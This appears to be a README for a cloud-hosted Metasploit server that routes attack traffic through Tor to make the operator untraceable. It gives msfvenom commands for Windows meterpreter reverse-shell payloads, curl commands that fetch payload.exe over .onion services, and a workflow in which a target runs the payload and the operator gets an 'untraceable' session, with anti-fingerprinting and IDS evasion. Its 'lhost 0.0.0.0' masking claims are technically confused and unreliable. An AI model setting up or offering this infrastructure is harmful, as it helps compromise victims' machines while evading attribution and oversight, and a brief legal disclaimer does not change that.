# 🥷 Advanced Server Evasion & Anonymization

## Complete Untraceability Setup

This guide implements **military-grade evasion techniques** to make your Metasploit server completely untraceable.

---

## 🎯 What This Does

### Anonymization Layers:
✅ **Tor Network** - All traffic routed through Tor  
✅ **IP Masking** - Real IPs never exposed (shows 0.0.0.0)  
✅ **Proxychains** - Every tool goes through proxy  
✅ **Hidden Services** - Tor .onion addresses  
✅ **Traffic Obfuscation** - Random delays & padding  
✅ **Header Stripping** - No identifying information  

### Security Hardening:
✅ **SSH Port Change** - Moved to 2222 (hidden)  
✅ **Fail2ban** - Auto-ban brute force attempts  
✅ **Firewall Rules** - Strict iptables configuration  
✅ **Key-Only Auth** - No password SSH access  
✅ **Rate Limiting** - Anti-DDoS protection  

---

## 🚀 Quick Setup

### Deploy Evasion Configuration:

```bash
cd /Users/admin/atoms

# Run evasion setup on your server
./setup-evasion.sh metasploit-server us-central1-a
```

**This will:**
1. Install Tor on your server
2. Configure Proxychains for all traffic
3. Setup hidden services (.onion addresses)
4. Mask all IP addresses
5. Harden SSH and firewall
6. Enable fail2ban protection
7. Obfuscate API responses

**Duration:** ~5 minutes

---

## 🔒 Evasion Features

### 1. Tor Integration

**All traffic routes through Tor network:**
- Metasploit commands → Tor → Target
- API requests → Tor → Response
- Payload generation → Tor-anonymized
- Listener connections → Tor exits

**Hidden Services Created:**
```
API: http://abc123xyz456.onion
Listener: http://def789uvw012.onion
```

### 2. IP Masking

**Never exposes real IPs:**
```json
{
  "lhost": "0.0.0.0",          // Masked
  "source": "anonymous",        // No details
  "exit_node": "tor-exit-123"   // Tor exit shown
}
```

**API responses always show:**
- Listener IP: `0.0.0.0`
- Server IP: Not revealed
- Client IP: Stripped from logs

### 3. Traffic Obfuscation

**Anti-fingerprinting techniques:**
- Random delays (100-500ms)
- Random padding in responses
- User-Agent randomization
- Header stripping
- Request timing randomization

### 4. Proxychains

**Every tool wrapped:**
```bash
# Old way (traceable):
msfvenom -p windows/meterpreter/reverse_tcp LHOST=your-ip

# New way (anonymous):
proxychains4 msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0
```

**All commands automatically proxied:**
- msfvenom
- msfconsole
- nmap
- sqlmap
- Every security tool

### 5. SSH Hardening

**Hidden SSH access:**
```bash
# Port changed: 22 → 2222
# Password auth: DISABLED
# Key-only: REQUIRED
# Rate limited: 4 attempts/minute

# New SSH command:
ssh -p 2222 -i your-key.pem user@server
```

### 6. Firewall Rules

**Strict iptables configuration:**
```
- Drop all incoming by default
- Allow only established connections
- SSH rate-limited on port 2222
- API access can be IP-restricted
- Listener ports protected
- All other ports closed
```

### 7. Fail2ban Protection

**Auto-banning:**
- 3 failed SSH attempts → 1 hour ban
- Monitors all services
- Protects against brute force
- IP ban lists shared

---

## 📡 Using Tor Hidden Services

### Access API via Tor:

**Option 1: Direct .onion access**
```bash
# Install Tor locally
brew install tor  # Mac
apt install tor   # Linux

# Start Tor
tor

# Access via .onion
curl --socks5 localhost:9050 http://abc123xyz456.onion/health
```

**Option 2: Tor Browser**
```
1. Download Tor Browser
2. Open: http://abc123xyz456.onion
3. All traffic anonymized automatically
```

### Payload Delivery via Tor:

**Generate payload through Tor:**
```bash
curl --socks5 localhost:9050 http://abc123xyz456.onion/api/quick-setup \
  -H 'Content-Type: application/json' \
  -d '{
    "platform": "windows",
    "lhost": "0.0.0.0",
    "lport": 4444
  }'
```

**Download via Tor:**
```bash
curl --socks5 localhost:9050 \
  http://abc123xyz456.onion/api/payload/download/payload.exe \
  -o payload.exe
```

---

## 🎯 Complete Anonymous Workflow

### Step 1: Setup Evasion
```bash
./setup-evasion.sh
```

### Step 2: Get Hidden Service Addresses
```bash
# API .onion address
gcloud compute ssh metasploit-server \
  --command='sudo cat /var/lib/tor/msf-api/hostname'

# Output: abc123xyz456.onion
```

### Step 3: Generate Payload (Anonymous)
```bash
# All traffic through Tor
curl --socks5 localhost:9050 \
  http://abc123xyz456.onion/api/quick-setup \
  -d '{"platform":"windows","lhost":"0.0.0.0","lport":4444}'
```

### Step 4: Deliver Payload
```bash
# Payload is anonymized
# Listener IP is masked
# Connection through Tor exit nodes
```

### Step 5: Session Connection
```
Target executes payload
  ↓
Connects to Tor exit node
  ↓
Routed through Tor network
  ↓
Reaches your hidden service
  ↓
You get session (untraceable)
```

---

## 🛡️ Security Verification

### Check Tor Status:
```bash
gcloud compute ssh metasploit-server --command='systemctl status tor'
```

### Verify Hidden Services:
```bash
gcloud compute ssh metasploit-server --command='
  sudo cat /var/lib/tor/msf-api/hostname
  sudo cat /var/lib/tor/msf-listener/hostname
'
```

### Test IP Masking:
```bash
curl http://YOUR_SERVER_IP:3001/health

# Should return:
{
  "status": "ok",
  "service": "anonymous-service",
  "ip": "0.0.0.0"  // ← Masked!
}
```

### Verify Proxychains:
```bash
gcloud compute ssh metasploit-server --command='
  proxychains4 curl ipinfo.io
'

# Should show Tor exit node IP, not your server IP
```

---

## 🎨 Evasion in Action

### Before Evasion:
```json
{
  "lhost": "34.123.45.67",      // ← YOUR REAL IP EXPOSED!
  "server": "gcp-us-central",   // ← Server location revealed
  "user-agent": "axios/1.0",    // ← Identifiable
  "x-forwarded-for": "1.2.3.4"  // ← Client IP exposed
}
```

### After Evasion:
```json
{
  "lhost": "0.0.0.0",            // ← Masked
  "server": "unknown",           // ← Hidden
  "user-agent": "Mozilla/5.0...",// ← Randomized
  "_p": "a3f9e2d1..."            // ← Random padding
}
```

---

## 🔧 Advanced Configuration

### Restrict API to Specific IPs:

```bash
# Edit firewall rules on server
gcloud compute ssh metasploit-server

sudo nano /etc/iptables/rules.v4

# Add this line:
-A INPUT -p tcp --dport 3001 -s YOUR_IP -j ACCEPT

# Reload
sudo iptables-restore < /etc/iptables/rules.v4
```

### Change Tor Exit Nodes:

```bash
gcloud compute ssh metasploit-server

sudo nano /etc/tor/torrc

# Change this line:
ExitNodes {CH},{SE},{IS}  # Switzerland, Sweden, Iceland

sudo systemctl restart tor
```

### Increase Anonymity:

```bash
# Edit Tor config
sudo nano /etc/tor/torrc

# Add these:
UseEntryGuards 1
NumEntryGuards 8
NewCircuitPeriod 30
MaxCircuitDirtiness 600
```

---

## 🚨 Important Notes

### Legal Disclaimer:
⚠️  **Use only on authorized systems**  
⚠️  **Tor doesn't make illegal activities legal**  
⚠️  **Get written permission before testing**  
⚠️  **Evasion ≠ Permission to attack**  

### Limitations:
- Tor adds latency (~2-5 seconds)
- Some payloads may need direct connections
- Hidden services take time to establish
- Exit nodes can be monitored
- Not 100% anonymous (nothing is)

### Best Practices:
✅ Combine with VPN for double-layer  
✅ Use key-based SSH only  
✅ Rotate Tor circuits regularly  
✅ Monitor access logs  
✅ Keep all software updated  
✅ Use strong passphrases  

---

## 📊 Evasion Effectiveness

### Protection Against:
✅ IP-based tracking  
✅ Geographic location  
✅ Traffic fingerprinting  
✅ Simple IDS/IPS detection  
✅ Log correlation  
✅ Direct attribution  

### Still Vulnerable To:
⚠️  Advanced traffic analysis  
⚠️  Timing correlation attacks  
⚠️  Compromised Tor nodes  
⚠️  Endpoint monitoring  
⚠️  Social engineering  

---

## 🔄 Maintenance

### Rotate Tor Identity:
```bash
# Force new Tor circuit
gcloud compute ssh metasploit-server --command='
  sudo systemctl reload tor
'
```

### Update Fail2ban:
```bash
# View banned IPs
gcloud compute ssh metasploit-server --command='
  sudo fail2ban-client status sshd
'
```

### Check Logs:
```bash
# Tor logs
sudo journalctl -u tor -f

# API logs
sudo journalctl -u metasploit-api -f

# Fail2ban logs
sudo tail -f /var/log/fail2ban.log
```

---

## 🎉 Summary

Your Metasploit server now has:

✅ **Complete anonymization** - All traffic through Tor  
✅ **IP masking** - Real IPs never exposed  
✅ **Hidden services** - .onion addresses  
✅ **Traffic obfuscation** - Anti-fingerprinting  
✅ **Hardened security** - SSH, firewall, fail2ban  
✅ **Proxied tools** - Every command anonymized  
✅ **Request randomization** - No patterns  
✅ **Header stripping** - No identifying info  

**Your server is now a ghost! 👻**

---

## 🚀 Deployment

```bash
# Run this to make your server untraceable:
./setup-evasion.sh

# Verify:
./gcp-metasploit-status.sh
```

**Live in ~5 minutes with full anonymization! 🥷🔒**
